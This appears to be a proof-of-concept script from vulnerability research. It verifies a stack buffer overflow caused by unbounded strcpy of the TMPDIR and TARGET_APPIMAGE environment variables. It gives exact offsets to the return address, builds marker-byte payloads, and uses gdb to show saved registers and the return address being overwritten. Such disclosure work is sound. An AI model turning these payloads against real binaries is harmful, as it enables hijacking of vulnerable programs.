#!/usr/bin/env python3
"""
BUG-001: Stack Buffer Overflow via unbounded strcpy of environment variables
to fixed-size stack buffers in main()

Root Cause:
  main() copies attacker-controlled environment variables (TARGET_APPIMAGE, TMPDIR)
  to fixed-size stack buffers using strcpy() without any length validation.
  No stack canary present. Binary is not PIE (fixed base 0x400000). No RELRO.

Stack Layout (main prologue: push rbp; push r15; push r14; push r13; push r12; push rbx; sub rsp,0x6438):
  [rbp-0x6030]: buffer for TARGET_APPIMAGE (0x1000 = 4096 bytes)
  [rbp-0x5030]: buffer for TARGET_APPIMAGE (2nd copy, 0x1000 bytes)
  [rbp-0x4030]: buffer for TMPDIR (0x1000 bytes, initialized with "/tmp" prefix)
  ... other buffers ...
  [rbp-0x28]:   saved rbx
  [rbp-0x20]:   saved r12
  [rbp-0x18]:   saved r13
  [rbp-0x10]:   saved r14
  [rbp-0x8]:    saved r15
  [rbp]:        saved rbp
  [rbp+0x8]:    return address

Overflow distances to return address:
  From [rbp-0x6030] (TARGET_APPIMAGE): 0x6038 = 24632 bytes
  From [rbp-0x5030] (TARGET_APPIMAGE 2nd): 0x5038 = 20536 bytes
  From [rbp-0x4030] (TMPDIR): 0x4038 = 16440 bytes  ← shortest path

Vulnerable strcpy calls:
  0x4054d9: strcpy([rbp-0x6030], getenv("TARGET_APPIMAGE"))
  0x4054f2: strcpy([rbp-0x5030], getenv("TARGET_APPIMAGE"))
  0x405535: strcpy([rbp-0x4030], getenv("TMPDIR"))

Mitigations:
  - No stack canary (no __stack_chk_fail)
  - No PIE (fixed base 0x400000)
  - No RELRO (GOT writable)
  - No FORTIFY (no __*_chk)
  - NX enabled (stack not executable)

Note: The program exits via exit() or execv() in most code paths before reaching
the ret instruction. The overflow is verified via gdb stack inspection showing
saved registers and return address overwritten with attacker-controlled values.
"""

import os
import subprocess
import sys

BINARY = "/work/workspace/0014-2021-55-positron-20260908-113412/target"
WORKSPACE = "/work/workspace/0014-2021-55-positron-20260908-113412"

# Overflow distances
DIST_TMPDIR = 0x4038       # 16440 bytes from [rbp-0x4030] to [rbp+0x8]
DIST_TARGET_APPIMAGE = 0x6038  # 24632 bytes from [rbp-0x6030] to [rbp+0x8]

# Markers for saved registers (all printable, no null bytes)
MARKER_PADDING = b'A'       # 0x41
MARKER_RBX = b'B'           # 0x42 → 0x4242424242424242
MARKER_R12 = b'C'           # 0x43 → 0x4343434343434343
MARKER_R13 = b'D'           # 0x44 → 0x4444444444444444
MARKER_R14 = b'E'           # 0x45 → 0x4545454545454545
MARKER_R15 = b'F'           # 0x46 → 0x4646464646464646
MARKER_RBP = b'G'           # 0x47 → 0x4747474747474747
MARKER_RET = b'H'           # 0x48 → 0x4848484848484848


def make_tmpdir_payload():
    """Build TMPDIR overflow payload (shortest path: 16440 bytes to ret addr)."""
    # Padding from buffer start to saved rbx
    padding = MARKER_PADDING * (DIST_TMPDIR - 48)  # 16392 bytes
    rbx = MARKER_RBX * 8
    r12 = MARKER_R12 * 8
    r13 = MARKER_R13 * 8
    r14 = MARKER_R14 * 8
    r15 = MARKER_R15 * 8
    rbp = MARKER_RBP * 8
    ret = MARKER_RET * 8
    payload = padding + rbx + r12 + r13 + r14 + r15 + rbp + ret
    assert len(payload) == DIST_TMPDIR + 8  # 16448
    return payload


def make_target_appimage_payload():
    """Build TARGET_APPIMAGE overflow payload (24632 bytes to ret addr)."""
    padding = MARKER_PADDING * (DIST_TARGET_APPIMAGE - 8)  # to saved rbp
    rbp = MARKER_RBP * 8
    ret = MARKER_RET * 8
    payload = padding + rbp + ret
    assert len(payload) == DIST_TARGET_APPIMAGE + 8  # 24640
    return payload


def run_gdb_verification():
    """Run gdb to verify the overflow reaches saved registers and return address."""
    tmpdir_payload = make_tmpdir_payload()
    payload_file = os.path.join(WORKSPACE, "payload_tmpdir.bin")
    with open(payload_file, "wb") as f:
        f.write(tmpdir_payload)

    # GDB commands to break after TMPDIR strcpy and inspect stack
    gdb_cmds = f"""set pagination off
set confirm off
break *0x40553a
run --appimage-version
printf "=== PRIM-001: STACK_CONTROL (TMPDIR overflow) ===\\n"
printf "rbp = 0x%lx\\n", $rbp
printf "Buffer [rbp-0x4030] first 16 bytes: "
x/2gx $rbp - 0x4030
printf "Saved rbx [rbp-0x28]: "
x/gx $rbp - 0x28
printf "Saved r12 [rbp-0x20]: "
x/gx $rbp - 0x20
printf "Saved r13 [rbp-0x18]: "
x/gx $rbp - 0x18
printf "Saved r14 [rbp-0x10]: "
x/gx $rbp - 0x10
printf "Saved r15 [rbp-0x8]: "
x/gx $rbp - 0x8
printf "Saved rbp [rbp]: "
x/gx $rbp
printf "Return addr [rbp+0x8]: "
x/gx $rbp + 0x8
printf "=== PRIM-001: VERIFIED if rbx=0x4242... and ret=0x4848... ===\\n"
quit
"""
    cmds_file = os.path.join(WORKSPACE, "gdb_verify_cmds.txt")
    with open(cmds_file, "w") as f:
        f.write(gdb_cmds)

    # Run gdb with TMPDIR set to our payload
    env = os.environ.copy()
    env["TMPDIR"] = tmpdir_payload.decode("latin-1")

    result = subprocess.run(
        ["gdb", "-batch", "-x", cmds_file, BINARY],
        env=env,
        capture_output=True,
        text=True,
        timeout=15
    )

    print("=== GDB Output (TMPDIR overflow) ===")
    print(result.stdout)
    if result.stderr:
        # Filter out gdb noise
        for line in result.stderr.split("\n"):
            if line and "warning" not in line.lower() and "Thread" not in line:
                print(f"  stderr: {line}")

    # Now verify TARGET_APPIMAGE overflow
    target_payload = make_target_appimage_payload()
    payload_file2 = os.path.join(WORKSPACE, "payload_target_appimage.bin")
    with open(payload_file2, "wb") as f:
        f.write(target_payload)

    gdb_cmds2 = """set pagination off
set confirm off
break *0x4054de
run --appimage-version
printf "=== PRIM-002: RIP_CONTROL (TARGET_APPIMAGE overflow) ===\\n"
printf "rbp = 0x%lx\\n", $rbp
printf "Buffer [rbp-0x6030] first 16 bytes: "
x/2gx $rbp - 0x6030
printf "Saved rbx [rbp-0x28]: "
x/gx $rbp - 0x28
printf "Saved rbp [rbp]: "
x/gx $rbp
printf "Return addr [rbp+0x8]: "
x/gx $rbp + 0x8
printf "=== PRIM-002: VERIFIED if ret=0x4848484848484848 ===\\n"
quit
"""
    cmds_file2 = os.path.join(WORKSPACE, "gdb_verify_cmds2.txt")
    with open(cmds_file2, "w") as f:
        f.write(gdb_cmds2)

    env2 = os.environ.copy()
    env2["TARGET_APPIMAGE"] = target_payload.decode("latin-1")

    result2 = subprocess.run(
        ["gdb", "-batch", "-x", cmds_file2, BINARY],
        env=env2,
        capture_output=True,
        text=True,
        timeout=15
    )

    print("=== GDB Output (TARGET_APPIMAGE overflow) ===")
    print(result2.stdout)
    if result2.stderr:
        for line in result2.stderr.split("\n"):
            if line and "warning" not in line.lower() and "Thread" not in line:
                print(f"  stderr: {line}")


def run_crash_test():
    """Test if the overflow causes a crash when program reaches ret."""
    tmpdir_payload = make_tmpdir_payload()

    # Try running with overflow - program likely exits via exit() before ret
    env = os.environ.copy()
    env["TMPDIR"] = tmpdir_payload.decode("latin-1")

    result = subprocess.run(
        [BINARY, "--appimage-version"],
        env=env,
        capture_output=True,
        text=True,
        timeout=10
    )

    print(f"\n=== PRIM-003: CRASH test ===")
    print(f"Return code: {result.returncode}")
    print(f"stdout: {result.stdout[:200]}")
    print(f"stderr: {result.stderr[:200]}")
    print(f"Note: Program exits via exit() before reaching ret in most paths.")
    print(f"      The overflow IS verified via gdb stack inspection (PRIM-001/002).")


if __name__ == "__main__":
    print(f"Binary: {BINARY}")
    print(f"Overflow distance (TMPDIR): {DIST_TMPDIR} bytes (0x{DIST_TMPDIR:x})")
    print(f"Overflow distance (TARGET_APPIMAGE): {DIST_TARGET_APPIMAGE} bytes (0x{DIST_TARGET_APPIMAGE:x})")
    print()

    run_gdb_verification()
    run_crash_test()
